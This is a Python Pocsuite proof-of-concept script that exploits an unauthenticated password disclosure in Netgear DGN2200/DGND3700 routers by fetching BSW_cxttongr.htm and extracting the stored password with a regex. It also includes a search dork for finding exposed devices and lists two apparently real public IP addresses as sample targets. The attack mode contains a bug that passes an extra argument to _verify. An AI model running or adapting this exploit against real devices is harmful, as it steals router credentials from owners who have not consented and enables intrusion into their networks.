#!/usr/bin/python
# -*- coding: utf-8 -*-

from pocsuite.api.request import req
from pocsuite.api.poc import Output, POCBase
from pocsuite.api.poc import register
import re


class TestPOC(POCBase):
    name = "netgear_DGN2200&DGND3700_password_disclosure"
    vulID = ''
    author = ['sebao']
    vulType = 'password_disclosure'
    version = '1.0'  # default version: 1.0
    references = 'https://www.seebug.org/vuldb/ssvid-97089'
    desc = '该信息泄漏漏洞存在于BSW_cxttongr.htm和BSW_wsw_summary.htm页面，直接访问即可.'


    vulDate = ''
    createDate = '2018-3-1'
    updateDate = '2018-3-1'

    appName = 'netgear'
    appVersion = 'DGN2200&DGND3700'

    dork = '"NETGEAR DGN2200"'
    appPowerLink = 'http://www.netgear.com'
    samples = ['http://175.37.1.229:8080',
               'http://195.137.127.103:8080']

    def _attack(self):

        return self._verify(self)

    def _verify(self):
        '''verify mode'''
        result = {}
        if self.url.endswith('/'):
            self.url = self.url[:-1]
        url = self.url + '/BSW_cxttongr.htm'
        resp = req.get(url)
        password = re.search('<td colspan="2"><b>Success \"(.+?)\"', resp.content)

        if resp.status_code == 200 and password:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['password'] = password.group(1)

        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register(TestPOC)
